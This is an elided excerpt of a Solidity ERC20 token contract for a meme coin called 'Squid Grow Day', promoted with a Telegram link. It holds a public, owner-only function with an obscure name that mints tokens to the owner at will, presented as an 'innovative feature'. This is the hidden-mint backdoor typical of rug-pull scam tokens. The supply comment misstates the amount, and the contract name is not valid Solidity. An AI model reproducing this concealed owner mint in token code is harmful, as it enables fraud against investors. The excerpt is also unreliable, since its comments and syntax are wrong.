...
//
// $SquidGrowDay proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SquidGrowDay
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SquidGrowDay(uint256 amount) public onlyOwner {
 _SquidGrowDay(msg.sender, amount);
    }
    ...
    function _SquidGrowDay(address account, uint256 amount) internal virtual {
...
contract $SquidGrowDay is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Squid Grow Day", "SQUIDGROWDAY") {
     _SquidGrowDay(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}